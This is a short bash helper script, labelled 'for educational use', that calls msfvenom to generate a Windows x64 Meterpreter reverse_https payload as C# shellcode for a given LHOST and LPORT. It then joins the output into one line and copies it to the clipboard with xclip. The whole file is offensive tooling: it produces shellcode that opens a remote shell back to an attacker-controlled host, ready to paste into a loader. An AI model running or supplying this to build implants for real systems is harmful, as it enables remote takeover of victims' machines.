#!/usr/bin/env bash
# Clean one-liner payload extractor for educational use

if ! command -v msfvenom &>/dev/null || ! command -v xclip &>/dev/null; then
  echo "msfvenom and xclip must be installed."
  exit 1
fi

if [ $# -ne 2 ]; then
  echo "Usage: $0 <LHOST> <LPORT>"
  exit 1
fi

LHOST="$1"
LPORT="$2"

# Extract the full C# shellcode and copy it to the clipboard as a single line
msfvenom -p windows/x64/meterpreter/reverse_https LHOST="$LHOST" LPORT="$LPORT" -f csharp 2>/dev/null \
| tr -d '\n' \
| xclip -selection clipboard

echo "[+] Full C# payload copied to clipboard as a single-line string."
